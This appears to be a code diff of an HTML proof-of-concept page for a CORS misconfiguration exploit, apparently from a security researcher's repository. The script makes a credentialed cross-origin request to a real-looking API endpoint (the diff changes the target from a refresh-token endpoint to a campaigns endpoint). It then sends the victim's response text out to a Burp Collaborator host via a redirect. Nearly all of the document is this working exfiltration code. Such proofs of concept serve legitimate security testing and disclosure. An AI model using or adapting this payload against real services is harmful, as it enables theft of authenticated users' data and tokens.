@@ -3,14 +3,14 @@
 <script>
 var req = new XMLHttpRequest();
 req.onload = reqListener;
-req.open('POST','https://emory-staging.zeiss.com/emoryservice/api/v1/login/refresh-token',true);
+req.open('GET','https://recurity.europe-west1.talon.farm/v1/applications/1/campaigns?pageSize=3&sort=-updated',true);
 req.withCredentials = true;
 req.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 req.setRequestHeader("Origin", "johanrydbergmoller.github.io");
 req.send();
 
 function reqListener() {
-location='https://g6npspur4yvmm084osoipgbtlkrafz.burpcollaborator.net/log?key='+this.responseText;
+location='https://jrexot4kreuekll6eixv6dh7syyomd.burpcollaborator.net/log?key='+this.responseText;
 };
 </script>
 </body>
